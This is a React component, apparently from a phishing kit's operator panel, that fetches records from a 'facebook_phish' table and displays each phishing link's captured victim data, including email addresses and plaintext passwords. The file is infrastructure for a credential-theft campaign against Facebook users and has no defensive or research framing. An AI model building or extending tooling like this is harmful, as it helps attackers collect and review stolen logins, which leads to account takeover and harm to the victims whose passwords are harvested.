import React, { useState, useEffect } from 'react';
import { supabase } from '../supabase';

export default function FacebookCaptures() {
  const [links, setLinks] = useState([]);
  const usuario = localStorage.getItem('usuario');
  useEffect(() => {
    async function fetchLinks() {
      const { data } = await supabase
        .from('facebook_phish')
        .select('*')
        .eq('email', usuario)
        .order('created_at', { ascending: false });
      setLinks(data || []);
    }
    fetchLinks();
  }, []);

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center', width: '100%' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', margin: '1.5rem 0 1rem 0', width: '100%' }}>Facebook Phishing Captures</h3>
      {links.length === 0 && <p style={{ color: 'var(--cinza-conspiracao)', textAlign: 'center', margin: '0 0 1.5rem 0', width: '100%' }}>No phishing links created yet.</p>}
      {links.map(link => (
        <div key={link.id} style={{
          background: 'var(--fundo-destaque)',
          borderRadius: 10,
          margin: '1rem auto',
          padding: '1rem',
          boxShadow: '0 2px 8px rgba(76,76,76,0.08)',
          maxWidth: 420,
          textAlign: 'left',
        }}>
          <div style={{ marginBottom: 8 }}>
            <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
          </div>
          <div style={{ fontSize: 14, color: 'var(--cinza-conspiracao)' }}>
            {(!link.capturas || link.capturas.length === 0) ? 'No data captured yet.' : `${link.capturas.length} capture(s):`}
          </div>
          {link.capturas && link.capturas.length > 0 && (
            <ul style={{ margin: '0.5rem 0 0 0', padding: 0, listStyle: 'none' }}>
              {link.capturas.map((c, i) => (
                <li key={i} style={{
                  background: 'rgba(255,143,163,0.08)',
                  borderRadius: 6,
                  margin: '0.25rem 0',
                  padding: '0.5rem',
                  color: 'var(--branco-confissao)'
                }}>
                  <div><b>Date:</b> {c.data}</div>
                  <div><b>Email:</b> {c.email}</div>
                  <div><b>Password:</b> {c.senha}</div>
                </li>
              ))}
            </ul>
          )}
        </div>
      ))}
    </div>
  );
}